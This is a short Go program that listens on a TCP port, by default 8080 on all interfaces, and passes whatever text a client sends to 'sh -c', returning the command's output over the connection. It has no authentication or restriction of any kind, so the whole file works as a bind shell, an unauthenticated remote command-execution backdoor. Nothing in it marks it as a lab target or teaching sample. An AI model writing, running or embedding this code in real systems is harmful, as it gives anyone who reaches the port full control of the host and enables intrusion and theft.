package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {
	port := flag.String("port", "8080", "listen port")
	flag.Parse()

	lis, err := net.Listen("tcp", ":"+*port)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	defer lis.Close() //nolint:errcheck
	fmt.Println("listening on :" + *port)

	for {
		conn, err := lis.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	defer conn.Close() //nolint:errcheck

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	cmdStr := strings.TrimSpace(string(buf[:n]))
	fmt.Printf("exec: %q\n", cmdStr)

	cmd := exec.Command("sh", "-c", cmdStr)
	out, _ := cmd.CombinedOutput()
	conn.Write(out)
}
